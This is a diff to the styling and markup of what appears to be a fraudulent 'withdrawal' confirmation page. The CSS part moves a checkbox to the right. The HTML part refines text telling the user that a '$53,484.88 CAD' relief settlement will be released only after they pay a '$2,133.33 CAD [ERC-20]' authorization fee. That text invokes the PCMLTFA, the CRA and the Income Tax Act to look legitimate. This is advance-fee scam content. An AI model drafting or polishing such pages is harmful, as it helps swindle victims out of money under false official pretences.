@@ -165,13 +165,22 @@ header {
 /* ---------- Checkbox ---------- */
 .checkbox-container {
   display: flex;
+  flex-direction: row-reverse; /* Flips the visual order so input goes to the right */
   align-items: flex-start;
-  gap: 12px;
+  justify-content: space-between; /* Pushes text to left, checkbox to far right */
+  gap: 16px; /* Slightly more breathing room since it's on the right */
   margin-top: 14px;
 }
+
 .checkbox-container input {
   margin-top: 4px;
+  cursor: pointer;
 }
+
+.checkbox-container label {
+  flex: 1; /* Ensures the label takes up all remaining space on the left */
+}
+
 
 /* =========================
 TOP RIGHT PROFILE POSITION
@@ -621,15 +630,15 @@ CROP MODAL
     <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
     
     <span style="display: block; margin-bottom: 12px;">
-        I hereby confirm the initiation of my withdrawal under the Hospitality Recovery & Relief Initiative and I acknowledge that this transaction is subjected to a mandatory authorization amount of <strong style="color: #1BE3FF; text-shadow: 0 0 8px rgba(164, 108, 255, 0.6);">$2,133.33 CAD [ERC-20]</strong> to cover the Bond Protection Value and CRA Withholding compliance in AVB under a Temporary Holding protocol.
+        I hereby confirm the initiation of my withdrawal under the Hospitality Recovery & Relief Initiative and I acknowledge that this transaction is subjected to a mandatory authorization amount of <strong style="color: #1BE3FF; text-shadow: 0 0 8px rgba(164, 108, 255, 0.6);">• $2,133.33 CAD [ERC-20]</strong> to cover the Bond Protection Value and CRA Withholding compliance in AVB under a Temporary Holding protocol.
     </span>
 
     <span style="display: block; margin-bottom: 12px; color: rgba(164, 108, 255, 0.85); font-size: 13px;">
-        This verification process is executed pursuant to the Proceeds of Crime (Money Laundering) and Terrorist Financing Act (PCMLTFA) and Section 153 of the Canadian Income Tax Act governing specialized sector disbursements and relief allocations exceeding the $500.00 CAD threshold;
+        This verification process is executed pursuant to the Proceeds of Crime (Money Laundering) and Terrorist Financing Act (PCMLTFA) and Section 153 of the Canadian Income Tax Act governing specialized sector disbursements and relief allocations exceeding the $500.00 CAD threshold.
     </span>
 
     <span style="display: block;">
-        That upon a successful verification of this Temporary Holding protocol, the Estimated Total Settlement of <strong style="color: #1BE3FF; text-shadow: 0 0 8px rgba(164, 108, 255, 0.6);">$53,484.88 CAD</strong> will be cleared and released to your designated financial institution.
+        Upon a successful verification of this Temporary Holding protocol, the Estimated Total Settlement of <strong style="color: #1BE3FF; text-shadow: 0 0 8px rgba(164, 108, 255, 0.6);">• $53,484.88 CAD</strong> will be cleared and released to your designated financial institution.
     </span>
 
 </label>
